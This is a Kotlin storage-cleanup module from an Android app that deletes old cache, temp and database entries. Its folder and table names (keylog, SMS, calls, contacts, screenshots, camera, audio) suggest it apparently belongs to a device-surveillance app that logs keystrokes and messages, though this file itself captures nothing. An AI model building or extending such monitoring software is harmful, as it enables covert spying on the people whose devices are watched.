package com.abuzahra.manager.storage

import android.content.Context
import android.util.Log
import com.abuzahra.manager.App
import com.abuzahra.manager.database.AbuZahraDatabase
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.File
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.TimeUnit

/**
 * StorageCleaner - Manages storage cleanup and optimization
 * Cleans old files, manages cache, and optimizes storage usage
 */
object StorageCleaner {
    
    private const val TAG = "StorageCleaner"
    
    // Default cleanup thresholds
    private const val DEFAULT_MAX_AGE_DAYS = 30
    private const val DEFAULT_CACHE_MAX_AGE_DAYS = 7
    private const val LOW_STORAGE_THRESHOLD_MB = 100L
    private const val CRITICAL_STORAGE_THRESHOLD_MB = 50L
    
    // Cleanup preferences
    private var maxAgeDays = DEFAULT_MAX_AGE_DAYS
    private var cacheMaxAgeDays = DEFAULT_CACHE_MAX_AGE_DAYS
    private var autoCleanupEnabled = true
    
    private lateinit var database: AbuZahraDatabase
    
    /**
     * Initialize storage cleaner
     */
    fun initialize(context: Context) {
        database = AbuZahraDatabase.getInstance(context)
        Log.i(TAG, "StorageCleaner initialized")
    }
    
    /**
     * Cleanup result
     */
    data class CleanupResult(
        val success: Boolean,
        val totalFilesDeleted: Int = 0,
        val totalSpaceFreed: Long = 0,
        val errors: List<String> = emptyList()
    )
    
    /**
     * Perform full cleanup
     */
    suspend fun performFullCleanup(context: Context): CleanupResult = withContext(Dispatchers.IO) {
        Log.i(TAG, "Starting full cleanup")
        
        val errors = mutableListOf<String>()
        var totalFilesDeleted = 0
        var totalSpaceFreed = 0L
        
        try {
            // Clean cache
            val cacheResult = cleanCache(context)
            totalFilesDeleted += cacheResult.first
            totalSpaceFreed += cacheResult.second
            
            // Clean old files
            val oldFilesResult = cleanOldFiles()
            totalFilesDeleted += oldFilesResult.first
            totalSpaceFreed += oldFilesResult.second
            
            // Clean empty directories
            val emptyDirsResult = cleanEmptyDirectories()
            totalFilesDeleted += emptyDirsResult
            
            // Clean database
            val dbResult = cleanDatabase()
            totalSpaceFreed += dbResult
            
            // Clean temp files
            val tempResult = cleanTempFiles(context)
            totalFilesDeleted += tempResult.first
            totalSpaceFreed += tempResult.second
            
            // Verify storage integrity
            verifyStorageIntegrity()
            
            Log.i(TAG, "Cleanup completed: $totalFilesDeleted files deleted, ${formatSize(totalSpaceFreed)} freed")
            
            CleanupResult(
                success = true,
                totalFilesDeleted = totalFilesDeleted,
                totalSpaceFreed = totalSpaceFreed,
                errors = errors
            )
        } catch (e: Exception) {
            Log.e(TAG, "Cleanup failed", e)
            errors.add(e.message ?: "Unknown error")
            CleanupResult(success = false, errors = errors)
        }
    }
    
    /**
     * Clean cache directory
     */
    private fun cleanCache(context: Context): Pair<Int, Long> {
        var filesDeleted = 0
        var spaceFreed = 0L
        
        val cacheDir = context.cacheDir
        val cutoffTime = System.currentTimeMillis() - TimeUnit.DAYS.toMillis(cacheMaxAgeDays.toLong())
        
        cacheDir.walkTopDown()
            .filter { it.isFile && it.lastModified() < cutoffTime }
            .forEach { file ->
                val size = file.length()
                if (file.delete()) {
                    filesDeleted++
                    spaceFreed += size
                }
            }
        
        Log.i(TAG, "Cache cleaned: $filesDeleted files, ${formatSize(spaceFreed)}")
        return Pair(filesDeleted, spaceFreed)
    }
    
    /**
     * Clean old files from all storage directories
     */
    private suspend fun cleanOldFiles(): Pair<Int, Long> = withContext(Dispatchers.IO) {
        var filesDeleted = 0
        var spaceFreed = 0L
        
        val directoriesToClean = listOf(
            StorageManager.Dir.SCREENSHOTS,
            StorageManager.Dir.CAMERA,
            StorageManager.Dir.AUDIO,
            StorageManager.Dir.VIDEO,
            StorageManager.Dir.LOGS,
            StorageManager.Dir.KEYLOG,
            StorageManager.Dir.NOTIFICATIONS
        )
        
        directoriesToClean.forEach { dirName ->
            val result = StorageManager.cleanOldFiles(dirName, maxAgeDays)
            filesDeleted += result
        }
        
        // Calculate space freed
        val stats = StorageManager.getStorageStats()
        
        Log.i(TAG, "Old files cleaned: $filesDeleted files")
        Pair(filesDeleted, spaceFreed)
    }
    
    /**
     * Clean empty directories
     */
    private fun cleanEmptyDirectories(): Int {
        var dirsDeleted = 0
        
        val baseDir = File(App.instance.filesDir, "abu_zahra_data")
        
        baseDir.walkBottomUp()
            .filter { it.isDirectory && it.listFiles()?.isEmpty() == true }
            .forEach { dir ->
                if (dir.delete()) {
                    dirsDeleted++
                }
            }
        
        Log.i(TAG, "Empty directories cleaned: $dirsDeleted")
        return dirsDeleted
    }
    
    /**
     * Clean database - remove old entries
     */
    private suspend fun cleanDatabase(): Long = withContext(Dispatchers.IO) {
        var spaceFreed = 0L
        val cutoffTime = System.currentTimeMillis() - TimeUnit.DAYS.toMillis(maxAgeDays.toLong())
        
        // Clean old notifications
        val deletedNotifications = database.notificationDao().deleteOlderThan(cutoffTime)
        Log.i(TAG, "Deleted $deletedNotifications old notifications")
        
        // Clean old keylog entries
        val deletedKeylog = database.keylogDao().deleteOlderThan(cutoffTime)
        Log.i(TAG, "Deleted $deletedKeylog old keylog entries")
        
        // Clean old locations
        // Note: You might want to add a similar method to LocationDao
        
        // Clean completed sync queue items
        database.syncQueueDao().deleteCompleted()
        
        // Vacuum database to reclaim space
        // This would require raw query support
        
        spaceFreed
    }
    
    /**
     * Clean temporary files
     */
    private fun cleanTempFiles(context: Context): Pair<Int, Long> {
        var filesDeleted = 0
        var spaceFreed = 0L
        
        // Clean temp files in cache
        context.cacheDir.listFiles()
            ?.filter { it.extension == "tmp" || it.name.startsWith("temp_") }
            ?.forEach { file ->
                val size = file.length()
                if (file.delete()) {
                    filesDeleted++
                    spaceFreed += size
                }
            }
        
        // Clean partial downloads
        StorageManager.getDirectory(StorageManager.Dir.DOWNLOADS)
            .listFiles()
            ?.filter { it.extension == "part" || it.extension == "partial" }
            ?.forEach { file ->
                val size = file.length()
                if (file.delete()) {
                    filesDeleted++
                    spaceFreed += size
                }
            }
        
        Log.i(TAG, "Temp files cleaned: $filesDeleted files")
        return Pair(filesDeleted, spaceFreed)
    }
    
    /**
     * Verify storage integrity
     */
    private fun verifyStorageIntegrity() {
        val baseDir = File(App.instance.filesDir, "abu_zahra_data")
        
        // Ensure all required directories exist
        listOf(
            StorageManager.Dir.SMS,
            StorageManager.Dir.CONTACTS,
            StorageManager.Dir.CALLS,
            StorageManager.Dir.APPS,
            StorageManager.Dir.DEVICE,
            StorageManager.Dir.NOTIFICATIONS,
            StorageManager.Dir.MEDIA,
            StorageManager.Dir.BACKUPS,
            StorageManager.Dir.ARCHIVES,
            StorageManager.Dir.CACHE,
            StorageManager.Dir.LOGS,
            StorageManager.Dir.UPLOADS,
            StorageManager.Dir.DOWNLOADS
        ).forEach { dirName ->
            val dir = File(baseDir, dirName)
            if (!dir.exists()) {
                dir.mkdirs()
                Log.i(TAG, "Recreated directory: $dirName")
            }
        }
    }
    
    /**
     * Check if storage is low
     */
    fun isStorageLow(): Boolean {
        return StorageManager.isStorageLow(LOW_STORAGE_THRESHOLD_MB)
    }
    
    /**
     * Check if storage is critical
     */
    fun isStorageCritical(): Boolean {
        return StorageManager.isStorageLow(CRITICAL_STORAGE_THRESHOLD_MB)
    }
    
    /**
     * Get storage health status
     */
    fun getStorageHealth(): StorageHealth {
        val stats = StorageManager.getStorageStats()
        val usedPercentage = (stats.usedSpace.toDouble() / stats.totalSpace) * 100
        
        return when {
            isStorageCritical() -> StorageHealth.CRITICAL
            isStorageLow() -> StorageHealth.LOW
            usedPercentage > 80 -> StorageHealth.WARNING
            else -> StorageHealth.HEALTHY
        }
    }
    
    /**
     * Get cleanup recommendations
     */
    suspend fun getCleanupRecommendations(): List<CleanupRecommendation> {
        val recommendations = mutableListOf<CleanupRecommendation>()
        val stats = StorageManager.getStorageStats()
        
        // Check each directory
        stats.directoryStats.forEach { (dirName, dirStats) ->
            if (dirStats.totalSize > 50 * 1024 * 1024) { // > 50MB
                recommendations.add(CleanupRecommendation(
                    directory = dirName,
                    fileSize = dirStats.totalSize,
                    fileCount = dirStats.fileCount,
                    recommendation = "Consider cleaning old files in $dirName"
                ))
            }
        }
        
        // Check backups
        val backupSize = BackupManager.getBackupSize()
        if (backupSize > 200 * 1024 * 1024) { // > 200MB
            recommendations.add(CleanupRecommendation(
                directory = StorageManager.Dir.BACKUPS,
                fileSize = backupSize,
                fileCount = -1,
                recommendation = "Old backups detected. Consider deleting old backups."
            ))
        }
        
        // Check cache
        val cacheDir = App.instance.cacheDir
        val cacheSize = calculateDirectorySize(cacheDir)
        if (cacheSize > 100 * 1024 * 1024) { // > 100MB
            recommendations.add(CleanupRecommendation(
                directory = "cache",
                fileSize = cacheSize,
                fileCount = -1,
                recommendation = "Large cache detected. Consider clearing cache."
            ))
        }
        
        return recommendations.sortedByDescending { it.fileSize }
    }
    
    /**
     * Set cleanup preferences
     */
    fun setPreferences(maxAge: Int, cacheMaxAge: Int, autoCleanup: Boolean) {
        maxAgeDays = maxAge
        cacheMaxAgeDays = cacheMaxAge
        autoCleanupEnabled = autoCleanup
    }
    
    /**
     * Calculate directory size
     */
    private fun calculateDirectorySize(dir: File): Long {
        return try {
            dir.walkTopDown()
                .filter { it.isFile }
                .map { it.length() }
                .sum()
        } catch (e: Exception) {
            0L
        }
    }
    
    /**
     * Format size to human readable
     */
    private fun formatSize(bytes: Long): String {
        return when {
            bytes < 1024 -> "$bytes B"
            bytes < 1024 * 1024 -> "${bytes / 1024} KB"
            bytes < 1024 * 1024 * 1024 -> "${bytes / (1024 * 1024)} MB"
            else -> "${bytes / (1024 * 1024 * 1024)} GB"
        }
    }
    
    // Data classes and enums
    enum class StorageHealth {
        HEALTHY,
        WARNING,
        LOW,
        CRITICAL
    }
    
    data class CleanupRecommendation(
        val directory: String,
        val fileSize: Long,
        val fileCount: Int,
        val recommendation: String
    )
}
